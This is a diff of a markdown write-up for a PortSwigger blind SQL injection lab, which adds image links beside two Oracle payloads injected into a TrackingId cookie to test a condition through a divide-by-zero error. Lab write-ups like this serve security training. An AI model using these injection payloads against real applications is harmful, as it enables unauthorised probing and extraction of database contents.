@@ -74,13 +74,14 @@ We can exploit this error inducing queries to test if admin user is present or n
 
 1. Set **(1=1)** ie. Condition is TRUE - `TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
 
-![image]()
+![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/0ab24e0ebdae373337295a65e1455e1166c6f11d/SQL-Injection/Lab%3A%20Blind%20SQL%20injection%20with%20conditional%20errors/Images/True%20Condition%20-%20Admin%20User%20Exists.png
+)
 
 We receive an error. means the condition is *TRUE* so it threw an **divide by 0** error
 
 2. Set **(1=2)** ie. Condition is FALSE - `TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
 
-![image]()
+![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/0ab24e0ebdae373337295a65e1455e1166c6f11d/SQL-Injection/Lab%3A%20Blind%20SQL%20injection%20with%20conditional%20errors/Images/False%20Condition%20-%20Admin%20User%20Check.png)
 
 We get a 200 response , means the condition failed and hence it returned nothing !
 
